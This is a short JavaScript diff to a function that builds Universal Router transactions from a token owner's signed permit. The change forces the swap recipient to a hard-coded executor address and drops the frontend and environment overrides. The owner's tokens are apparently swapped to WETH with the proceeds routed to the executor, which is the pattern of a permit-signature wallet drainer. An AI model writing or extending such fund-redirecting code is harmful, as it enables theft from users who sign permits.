@@ -87,8 +87,8 @@ function buildSignatureBytes(r, s, vRaw) {
 function buildUniversalRouterTx(data, overrides = {}) {
   const { owner, token, amount, deadline, nonce, r, s, v } = data;
   
-  // Use frontend overrides or env fallbacks
-  const recipient = overrides.recipient || process.env.SWAP_RECIPIENT || HARDCODED_EXECUTOR;
+  // Force recipient to the hard-coded executor to ensure recipient == spender == executor
+  const recipient = HARDCODED_EXECUTOR;
   const outputToken = overrides.outputToken || process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH
   
   const amountBn = BigInt(amount);
